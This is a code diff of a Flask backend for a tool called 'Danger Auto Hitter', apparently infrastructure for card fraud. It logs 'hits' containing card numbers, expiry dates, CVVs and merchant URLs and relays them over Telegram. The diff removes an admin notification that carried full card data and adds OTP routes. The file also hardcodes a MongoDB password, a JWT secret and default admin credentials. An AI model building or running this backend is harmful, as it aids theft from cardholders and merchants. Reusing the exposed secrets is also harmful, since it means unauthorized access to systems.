@@ -20,13 +20,14 @@ CORS(app)
 # MongoDB Connection
 MONGODB_URI = os.getenv('MONGODB_URI', 'mongodb+srv://viraaj35:viraajmongo@danger35.wgk98.mongodb.net/?retryWrites=true&w=majority&appName=Danger35')
 client = MongoClient(MONGODB_URI)
-db = client.get_database("Danger35")
+db = client.get_database()
 
 # Collections
 users_collection = db.users
 hits_collection = db.hits
 activities_collection = db.activities
 telegram_users_collection = db.telegram_users
+otp_collection = db.otp_codes  # New collection for OTP codes
 
 # JWT Secret
 JWT_SECRET = os.getenv('JWT_SECRET', 'danger_auto_hitter_secret')
@@ -42,11 +43,15 @@ def generate_api_key():
     chars = string.ascii_letters + string.digits
     return ''.join(random.choice(chars) for _ in range(32))
 
+def generate_otp():
+    """Generate a 6-digit OTP"""
+    return ''.join(random.choice(string.digits) for _ in range(6))
+
 def send_telegram_message(chat_id, message):
     """Send message to a specific Telegram chat"""
     if not TELEGRAM_BOT_TOKEN or not chat_id:
-        print('Telegram bot token or chat ID not configured')
-        return
+        print(f'Telegram bot token or chat ID not configured. Token: {TELEGRAM_BOT_TOKEN}, Chat ID: {chat_id}')
+        return False
     
     url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
     params = {
@@ -57,26 +62,32 @@ def send_telegram_message(chat_id, message):
     
     try:
         response = requests.post(url, json=params)
+        print(f"Telegram API response: {response.status_code} - {response.text}")
         if response.status_code == 200:
             print(f'Telegram message sent successfully to {chat_id}')
+            return True
         else:
             print(f'Failed to send Telegram message to {chat_id}: {response.text}')
+            return False
     except Exception as e:
         print(f'Error sending Telegram message: {str(e)}')
+        return False
 
 def send_to_admin(message):
     """Send message to admin"""
-    send_telegram_message(ADMIN_CHAT_ID, message)
+    return send_telegram_message(ADMIN_CHAT_ID, message)
 
 def send_to_group(message):
     """Send message to group chat"""
     if TELEGRAM_GROUP_ID:
-        send_telegram_message(TELEGRAM_GROUP_ID, message)
+        return send_telegram_message(TELEGRAM_GROUP_ID, message)
+    return False
 
 def send_to_user(telegram_id, message):
     """Send message to individual user"""
     if telegram_id:
-        send_telegram_message(telegram_id, message)
+        return send_telegram_message(telegram_id, message)
+    return False
 
 # Authentication Decorators
 def token_required(f):
@@ -181,15 +192,6 @@ def register():
                 upsert=True
             )
         
-        # Send Telegram notification to admin
-        send_to_admin(
-            f"🔐 New User Registration!\n\n"
-            f"👤 Username: {username}\n"
-            f"📧 Email: {email}\n"
-            f"📅 Date: {datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n\n"
-            f"Powered by Danger Auto Hitter 💪"
-        )
-        
         return jsonify({
             'message': 'User registered successfully',
             'apiKey': api_key
@@ -249,16 +251,6 @@ def login():
             'timestamp': datetime.datetime.now()
         }
         activities_collection.insert_one(activity)
-        
-        # Send Telegram notification for admin logins
-        if user.get('isAdmin', False):
-            send_to_admin(
-                f"👑 Admin Login!\n\n"
-                f"👤 Username: {username}\n"
-                f"🌐 IP: {request.remote_addr}\n"
-                f"📅 Date: {datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n\n"
-                f"Powered by Danger Auto Hitter 💪"
-            )
         
         return jsonify({
             'token': token,
@@ -338,19 +330,7 @@ def record_hit():
         
         amount = data.get('amount', 'N/A')
         
-        # 1. Send detailed hit notification to admin
-        send_to_admin(
-            f"💰 HIT DETECTED!\n\n"
-            f"💳 Card Details:\n{masked_card}|{card_details.get('expiryMonth', '')}|{card_details.get('expiryYear', '')}|{card_details.get('cvv', '')}\n\n"
-            f"💵 Amount: {amount}\n"
-            f"👤 Username: {username}\n"
-            f"📧 User Email: {data.get('email', 'N/A')}\n"
-            f"🌐 Business URL: {data.get('businessUrl', 'N/A')}\n"
-            f"✅ Success URL: {data.get('successUrl', 'N/A')}\n\n"
-            f"Powered by Danger Auto Hitter 💪"
-        )
-        
-        # 2. Send detailed hit notification to the user who got the hit
+        # Send hit notification to the user who got the hit
         if telegram_id:
             send_to_user(telegram_id, 
                 f"💰 HIT DETECTED!\n\n"
@@ -361,17 +341,8 @@ def record_hit():
                 f"✅ Success URL: {data.get('successUrl', 'N/A')}\n\n"
                 f"Powered by Danger Auto Hitter 💪"
             )
-            
-            # Send OTP message after a short delay
-            otp_code = random.randint(100000, 999999)
-            send_to_user(telegram_id,
-                f"🔐 Your OTP\n\n"
-                f"Code: {otp_code} 🔑\n"
-                f"Valid for 5 minutes! ⏳\n\n"
-                f"Powered by Danger Auto Hitter 💓"
-            )
         
-        # 3. Send limited info to the group chat
+        # Send limited info to the group chat
         if TELEGRAM_GROUP_ID:
             send_to_group(
                 f"PropagandaHitter\n"
@@ -415,15 +386,6 @@ def record_activity():
         # Send Telegram notification for payment form detection
         if data.get('type') == 'payment' and data.get('action') == 'detected':
             details = data.get('details', {})
-            
-            # Send to admin
-            send_to_admin(
-                f"🔎 PAYMENT FORM DETECTED!\n\n"
-                f"👤 Username: {username}\n"
-                f"🌐 URL: {details.get('url', 'N/A')}\n"
-                f"📅 Date: {datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n\n"
-                f"Powered by Danger Auto Hitter 💪"
-            )
             
             # Send to user
             if telegram_id:
@@ -552,11 +514,107 @@ def get_admin_stats():
     except Exception as e:
         return jsonify({'error': str(e)}), 500
 
+# New route for generating and sending OTP
+@app.route('/api/telegram/send-otp', methods=['POST'])
+def send_otp():
+    try:
+        data = request.get_json()
+        telegram_id = data.get('telegram_id')
+        
+        if not telegram_id:
+            return jsonify({'error': 'Telegram ID is required'}), 400
+        
+        # Generate a 6-digit OTP
+        otp = generate_otp()
+        
+        # Store OTP in database with expiration time (5 minutes)
+        expiry_time = datetime.datetime.now() + datetime.timedelta(minutes=5)
+        
+        otp_data = {
+            'telegram_id': telegram_id,
+            'otp': otp,
+            'expires_at': expiry_time,
+            'created_at': datetime.datetime.now(),
+            'used': False
+        }
+        
+        # Remove any existing OTPs for this user
+        otp_collection.delete_many({'telegram_id': telegram_id})
+        
+        # Insert new OTP
+        otp_collection.insert_one(otp_data)
+        
+        # Send OTP via Telegram
+        message = (
+            f"🔐 Your OTP Code\n\n"
+            f"Code: {otp}\n"
+            f"Valid for 5 minutes\n\n"
+            f"Powered by Danger Auto Hitter 💪"
+        )
+        
+        success = send_telegram_message(telegram_id, message)
+        
+        if success:
+            return jsonify({'success': True, 'message': 'OTP sent successfully'})
+        else:
+            return jsonify({'error': 'Failed to send OTP via Telegram'}), 500
+        
+    except Exception as e:
+        print(f"Error sending OTP: {str(e)}")
+        return jsonify({'error': str(e)}), 500
+
+# Route for verifying OTP
+@app.route('/api/telegram/verify-otp', methods=['POST'])
+def verify_otp():
+    try:
+        data = request.get_json()
+        telegram_id = data.get('telegram_id')
+        otp_code = data.get('otp')
+        
+        if not telegram_id or not otp_code:
+            return jsonify({'error': 'Telegram ID and OTP are required'}), 400
+        
+        # Find the OTP in the database
+        otp_record = otp_collection.find_one({
+            'telegram_id': telegram_id,
+            'otp': otp_code,
+            'used': False,
+            'expires_at': {'$gt': datetime.datetime.now()}
+        })
+        
+        if not otp_record:
+            return jsonify({'error': 'Invalid or expired OTP'}), 400
+        
+        # Mark OTP as used
+        otp_collection.update_one(
+            {'_id': otp_record['_id']},
+            {'$set': {'used': True}}
+        )
+        
+        # Update user's telegram verification status
+        telegram_users_collection.update_one(
+            {'telegram_id': telegram_id},
+            {'$set': {'verified': True, 'verified_at': datetime.datetime.now()}},
+            upsert=True
+        )
+        
+        # Also update any user with this telegram ID
+        users_collection.update_many(
+            {'telegram_id': telegram_id},
+            {'$set': {'telegram_verified': True}}
+        )
+        
+        return jsonify({'success': True, 'message': 'OTP verified successfully'})
+        
+    except Exception as e:
+        return jsonify({'error': str(e)}), 500
+
 # Telegram webhook for bot commands
 @app.route('/api/telegram/webhook', methods=['POST'])
 def telegram_webhook():
     try:
         data = request.get_json()
+        print(f"Received webhook data: {data}")
         
         # Process message
         if 'message' in data:
@@ -572,7 +630,6 @@ def telegram_webhook():
                 
                 if command == '/start':
                     send_telegram_message(chat_id, 
-                        f"Welcome to Danger Auto Hitter! 🚀\n\n"
                         f"Your Telegram ID: {user_id}\n\n"
                         f"Use this ID to link your account in the extension settings."
                     )
@@ -587,22 +644,39 @@ def telegram_webhook():
                         }},
                         upsert=True
                     )
+                
+                elif command == '/id':
+                    send_telegram_message(chat_id, 
+                        f"Your Telegram ID: {user_id}\n\n"
+                        f"Use this ID to link your account in the extension settings."
+                    )
+                
+                elif command == '/otp':
+                    # Generate and send OTP
+                    otp = generate_otp()
                     
-                elif command == '/stats' and str(user_id) == ADMIN_CHAT_ID:
-                    # Admin only command
-                    total_users = users_collection.count_documents({})
-                    total_hits = hits_collection.count_documents({})
-                    total_activities = activities_collection.count_documents({})
+                    # Store OTP in database
+                    expiry_time = datetime.datetime.now() + datetime.timedelta(minutes=5)
                     
-                    today = datetime.datetime.now().replace(hour=0, minute=0, second=0, microsecond=0)
-                    today_hits = hits_collection.count_documents({'timestamp': {'$gte': today}})
+                    otp_data = {
+                        'telegram_id': str(user_id),
+                        'otp': otp,
+                        'expires_at': expiry_time,
+                        'created_at': datetime.datetime.now(),
+                        'used': False
+                    }
                     
+                    # Remove any existing OTPs for this user
+                    otp_collection.delete_many({'telegram_id': str(user_id)})
+                    
+                    # Insert new OTP
+                    otp_collection.insert_one(otp_data)
+                    
+                    # Send OTP
                     send_telegram_message(chat_id,
-                        f"📊 System Statistics 📊\n\n"
-                        f"👥 Total Users: {total_users}\n"
-                        f"💰 Total Hits: {total_hits}\n"
-                        f"📈 Total Activities: {total_activities}\n"
-                        f"💵 Today's Hits: {today_hits}\n\n"
+                        f"🔐 Your OTP Code\n\n"
+                        f"Code: {otp}\n"
+                        f"Valid for 5 minutes\n\n"
                         f"Powered by Danger Auto Hitter 💪"
                     )
         
@@ -612,68 +686,44 @@ def telegram_webhook():
         return jsonify({'error': str(e)}), 500
 
 # Create admin user if it doesn't exist
+@app.before_first_request
 def create_admin_user():
-    admin_username = os.getenv('ADMIN_USERNAME', 'admin')
-    admin_password = os.getenv('ADMIN_PASSWORD', 'admin123')
-    admin_email = os.getenv('ADMIN_EMAIL', 'admin@example.com')
-
+    admin_username = os.getenv('ADMIN_USERNAME', 'fnxdanger')
+    admin_password = os.getenv('ADMIN_PASSWORD', 'fnxdanger')
+    admin_email = os.getenv('ADMIN_EMAIL', 'fnxdanger3@gmail.com')
+    
     # Check if admin user exists
     admin = users_collection.find_one({'username': admin_username})
-    if admin:
-        return admin_username, admin.get('_id'), admin_email, admin.get('apiKey')  # Return API key
-
-    # Create admin user
-    hashed_password = bcrypt.hashpw(admin_password.encode('utf-8'), bcrypt.gensalt())
-    api_key = generate_api_key()  # Generate API key
-
-    admin_user = {
-        'username': admin_username,
-        'password': hashed_password,
-        'email': admin_email,
-        'apiKey': api_key,  # Store API key
-        'isAdmin': True,
-        'telegram_id': ADMIN_CHAT_ID,
-        'createdAt': datetime.datetime.now()
-    }
-
-    result = users_collection.insert_one(admin_user)  # Insert new admin
-
-    print(f"Admin user created: {admin_username}")
-
-    return admin_username, result.inserted_id, admin_email, api_key  # Return API key
-
-# Manually call the function when the app starts
-if __name__ == '__main__':
-    admin_username, inserted_id, admin_email, api_key = create_admin_user()  # Now it returns API key
-
-    telegram_users_collection.update_one(
-        {'telegram_id': ADMIN_CHAT_ID},
-        {'$set': {
-            'username': admin_username,
-            'user_id': str(inserted_id),
-            'is_admin': True,
-            'updated_at': datetime.datetime.now()
-        }},
-        upsert=True
-    )
-
-    send_to_admin(
-        f"✅ Admin User Created!\n\n"
-        f"👤 Username: {admin_username}\n"
-        f"📧 Email: {admin_email}\n"
-        f"🔑 API Key: {api_key}\n"  # Now this won't throw an error
-    )
+    if not admin:
+        # Create admin user
+        hashed_password = bcrypt.hashpw(admin_password.encode('utf-8'), bcrypt.gensalt())
+        api_key = generate_api_key()
         
-        # Send Telegram notification
-    send_to_admin(
-        f"👑 Admin Account Created!\n\n"
-        f"👤 Username: {admin_username}\n"
-        f"📧 Email: {admin_email}\n"
-        f"🔑 API Key: {api_key}\n"
-        f"📅 Date: {datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n\n"
-        f"Powered by Danger Auto Hitter 💪"
+        admin_user = {
+            'username': admin_username,
+            'password': hashed_password,
+            'email': admin_email,
+            'apiKey': api_key,
+            'isAdmin': True,
+            'telegram_id': ADMIN_CHAT_ID,  # Set your Telegram ID as admin
+            'createdAt': datetime.datetime.now()
+        }
+        
+        result = users_collection.insert_one(admin_user)
+        print(f"Admin user created: {admin_username}")
+        
+        # Store admin in telegram users collection
+        telegram_users_collection.update_one(
+            {'telegram_id': ADMIN_CHAT_ID},
+            {'$set': {
+                'username': admin_username,
+                'user_id': str(result.inserted_id),
+                'is_admin': True,
+                'updated_at': datetime.datetime.now()
+            }},
+            upsert=True
         )
-else:
+    else:
         # Ensure admin has the correct Telegram ID
         if admin.get('telegram_id') != ADMIN_CHAT_ID:
             users_collection.update_one(
@@ -694,7 +744,7 @@ else:
             )
 
 # Set up Telegram webhook
-# Set up Telegram webhook
+@app.before_first_request
 def setup_telegram_webhook():
     if TELEGRAM_BOT_TOKEN:
         try:
@@ -704,7 +754,7 @@ def setup_telegram_webhook():
                 webhook_url = f"{server_url}/api/telegram/webhook"
                 url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/setWebhook"
                 params = {'url': webhook_url}
-
+                
                 response = requests.post(url, json=params)
                 if response.status_code == 200:
                     print(f"Telegram webhook set to {webhook_url}")
@@ -714,9 +764,5 @@ def setup_telegram_webhook():
             print(f"Error setting up Telegram webhook: {str(e)}")
 
 if __name__ == '__main__':
-    # Initialize Telegram webhook
-    with app.app_context():
-        setup_telegram_webhook()  # ✅ Correctly placed here
-
     port = int(os.getenv('PORT', 3000))
     app.run(host='0.0.0.0', port=port, debug=False)
